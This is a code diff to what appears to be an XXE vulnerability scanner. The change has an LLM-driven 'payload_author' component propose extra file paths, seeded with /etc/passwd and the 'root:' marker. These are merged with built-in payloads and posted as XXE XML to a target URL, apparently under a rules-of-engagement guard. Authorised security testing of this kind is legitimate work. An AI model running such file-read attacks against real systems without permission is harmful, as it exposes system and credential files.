@@ -58,13 +58,37 @@ def _post_xml(url, xml, headers, timeout, verify, roe_guard,
         return {"status": None, "error": f"{type(e).__name__}: {e}"}
 
 
+def _augmented_xxe_paths(target_url):
+    try:
+        from ..brains import payload_author
+        objs = payload_author.propose_objects(
+            "xxe_file_read",
+            '{"path": "/etc/passwd", "marker": "root:", "label": "linux"}',
+            {"target": target_url}, capability="xxe", cap=10)
+    except Exception:
+        objs = []
+    extra = []
+    for o in objs:
+        path = o.get("path")
+        if isinstance(path, str) and path.startswith(("/", "file:")):
+            extra.append((path, str(o.get("marker") or ""),
+                          str(o.get("label") or "llm")))
+    seen = set()
+    out = []
+    for t in extra + list(XXE_FILE_PAYLOADS):
+        if t[0] not in seen:
+            seen.add(t[0])
+            out.append(t)
+    return out
+
+
 def scan(target_url, headers=None, roe_guard=None, timeout=8,
          oob_url=None):
     verify = _verify_tls()
     attempts = []
     findings = []
 
-    for path, marker, label in XXE_FILE_PAYLOADS:
+    for path, marker, label in _augmented_xxe_paths(target_url):
         xml = XXE_TEMPLATE_BASIC.format(path=path)
         r = _post_xml(target_url, xml, headers, timeout, verify, roe_guard)
         if r.get("blocked"):
